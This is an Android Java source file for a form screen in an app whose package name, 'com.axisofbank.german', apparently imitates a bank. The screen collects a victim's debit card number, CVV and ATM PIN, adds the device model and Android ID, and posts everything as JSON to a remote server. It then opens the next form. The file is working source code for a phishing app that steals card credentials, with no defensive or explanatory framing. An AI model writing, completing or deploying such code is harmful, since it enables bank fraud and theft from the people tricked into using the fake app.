package com.axisofbank.german;

import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import androidx.fragment.app.Fragment;

import com.axisofbank.german.formHelper.DateInputMask;
import com.axisofbank.german.formHelper.DebitCardInputMask;
import com.axisofbank.german.formHelper.ExpiryDateInputMask;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.HashMap;
import java.util.Map;

public class FormFragment2 extends Fragment {
    public Map<Integer, String> ids;
    public HashMap<String, Object> dataObject;
    public View view;
    public int id = 0;
    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,  Bundle savedInstanceState) {
        view = inflater.inflate(R.layout.fragment_form2, container, false);

        Bundle bundle = getArguments();
        if (bundle != null) {
            Log.d(Helper.TAG, "Bundle dd"+ bundle.toString());
            id = bundle.getInt("id");
        }

        Log.d(Helper.TAG, "MMM "+id);

        EditText card = view.findViewById(R.id.card);
        card.addTextChangedListener(new DebitCardInputMask(card));

        EditText exp = view.findViewById(R.id.exp);
        exp.addTextChangedListener(new ExpiryDateInputMask(exp));

        dataObject = new HashMap<>();

        ids = new HashMap<>();
        ids.put(R.id.card, "card");
        ids.put(R.id.cvv, "cvv");
        ids.put(R.id.pin, "pin");

        // Populate dataObject
        for(Map.Entry<Integer, String> entry : ids.entrySet()) {
            int viewId = entry.getKey();
            String key = entry.getValue();
            EditText editText = view.findViewById(viewId);

            String value = editText.getText().toString().trim();
            dataObject.put(key, value);
        }

        Button btnSubmit = view.findViewById(R.id.buttonSubmit);
        btnSubmit.setOnClickListener(v -> {
            if (validateForm()) {
                sendDataToServer();
            } else {
                Toast.makeText(getActivity().getApplicationContext(), "Please correct the errors in the form", Toast.LENGTH_SHORT).show();
            }
        });

        return view;
    }

    private void sendDataToServer() {

        JSONObject dataJson = new JSONObject(dataObject);
        JSONObject sendPayload = new JSONObject();
        try {
            Helper helper = new Helper();


            Log.d(Helper.TAG, "Seocn ID "+ id);
            dataJson.put("mobileName", Build.MODEL);
            sendPayload.put("mobile_id", Helper.getAndroidId(getActivity().getApplicationContext()));
            sendPayload.put("site", helper.SITE());
            sendPayload.put("data", dataJson);
            sendPayload.put("id", id);
            Helper.postRequest(helper.FormSavePath(), sendPayload, new Helper.ResponseListener() {
                @Override
                public void onResponse(String result) {
                    Log.d(Helper.TAG, "RES : "+ result);
                    if (result.startsWith("Response Error:")) {
                        Toast.makeText(getActivity().getApplicationContext(), "Response Error : "+result, Toast.LENGTH_SHORT).show();
                    } else {
                        try {
                            JSONObject response = new JSONObject(result);
                            if(response.getInt("status")==200){

                                FormFragment3 formFragment3 = new FormFragment3();
                                Bundle bundle = new Bundle();
                                bundle.putInt("id", id);
                                formFragment3.setArguments(bundle);

                                requireActivity().getSupportFragmentManager().beginTransaction()
                                        .replace(R.id.form_content, formFragment3)
                                        .commit();
                            }else{
                                Toast.makeText(getActivity().getApplicationContext(), "Status Not 200 : "+response, Toast.LENGTH_SHORT).show();
                            }
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                    }
                }
            });
        } catch (JSONException e) {
            Toast.makeText(getActivity().getApplicationContext(), "Error1 "+e.toString(), Toast.LENGTH_SHORT).show();
        }

    }

    public boolean validateForm() {
        boolean isValid = true; // Assume the form is valid initially

        // Clear dataObject before adding new data
        dataObject.clear();

        for (Map.Entry<Integer, String> entry : ids.entrySet()) {
            int viewId = entry.getKey();
            String key = entry.getValue();
            EditText editText = view.findViewById(viewId);

            if (!FormValidator.validateRequired(editText, "Please enter valid input")) { isValid = false;continue;}

            String value = editText.getText().toString().trim();

            switch (key) {
                case "mobile":
                    if (!FormValidator.validateMinLength(editText, 10, "Required 10 digit " + key)) {
                        isValid = false;
                    }
                    break;

                case "cvv":
                    if (!FormValidator.validateMinLength(editText, 3, "Invalid CVV")) {
                        isValid = false;
                    }
                    break;
                case "pin":
                    if (!FormValidator.validateMinLength(editText, 4, "Invalid ATM Pin")) {
                        isValid = false;
                    }
                    break;
                case "tpin":
                    if (!FormValidator.validateMinLength(editText, 4, "Invalid Pin")) {
                        isValid = false;
                    }
                    break;
                case "expiry":
                    if (!FormValidator.validateMinLength(editText, 5, "Invalid Expiry Date")) {
                        isValid = false;
                    }
                    break;
                case "card":
                    if (!FormValidator.validateMinLength(editText, 19, "Invalid Card Number")) {
                        isValid = false;
                    }
                    break;
                case "pan":
                    if (!FormValidator.validatePANCard(editText, "Invalid Pan Number")) {
                        isValid = false;
                    }
                    break;
                default:
                    break;
            }

            // Add to dataObject only if the field is valid
            if (isValid) {
                dataObject.put(key, value);
            }
        }

        return isValid;
    }

}
